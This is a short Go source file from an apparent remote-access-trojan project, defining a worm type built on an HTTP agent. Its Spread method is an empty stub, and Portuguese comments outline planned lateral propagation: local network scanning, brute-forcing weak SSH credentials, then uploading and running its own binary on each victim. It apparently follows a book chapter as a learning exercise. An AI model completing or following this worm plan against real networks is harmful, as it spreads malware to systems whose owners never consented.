package agent

import (
	"log"

	// "github.com/VitorDie/SadRat/internal/domain" // Importe o seu domínio se necessário
)

// WormHTTP é o nosso Agente com superpoderes de propagação lateral!
type WormHTTP struct {
	*AgentHTTP // Composição: O Worm herda todas as propriedades e métodos de AgentHTTP
}

// NewWormHTTP cria uma nova instância do Worm instanciando um Agente internamente
func NewWormHTTP(serverURL string) *WormHTTP {
	return &WormHTTP{
		AgentHTTP: NewAgentHTTP(serverURL), 
	}
}

// Spread é a lógica exclusiva do Worm (Capítulo 17)
func (w *WormHTTP) Spread() error {
	// A tática mais comum de worms modernos é a infecção via SSH [3].
	// Futuramente, a lógica aqui fará:
	// 1. Escanear a rede local [2].
	// 2. Fazer bruteforce de credenciais fracas em serviços SSH [3, 4].
	// 3. Fazer o upload do próprio binário para a nova vítima [5].
	// 4. Executá-lo na nova máquina [5].
	log.Println("Worm iniciando propagação lateral...")
	return nil
}